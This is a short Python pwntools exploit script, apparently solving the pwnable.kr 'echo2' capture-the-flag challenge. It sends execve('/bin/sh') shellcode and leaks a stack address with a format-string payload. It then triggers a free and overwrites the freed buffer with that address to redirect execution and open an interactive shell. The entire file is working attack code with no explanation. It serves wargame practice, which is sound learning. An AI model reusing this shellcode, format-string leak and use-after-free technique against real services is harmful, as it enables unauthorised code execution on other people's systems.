from pwn import *
context.log_level = 'debug'

locale = 1
if locale:
    p = process('./echo2')
else:
    p = remote("pwnable.kr", 9011)
p.recvuntil(":")

shellcode = "\xf7\xe6\x50\x48\xbf\x2f\x62\x69\x6e\x2f\x2f"
shellcode += "\x73\x68\x57\x48\x89\xe7\xb0\x3b\x0f\x05"

p.sendline(shellcode)

p.recvuntil(">")
p.sendline('2')
p.sendline("%10$p")
p.recvline()
#gdb.attach(p)
# leak addr
addr = int(p.recvline(), 16) - 0x20
# free
p.sendline('4')
p.sendline('n')
p.sendline('3')
p.sendline('A' * 24 + p64(addr))
p.interactive()
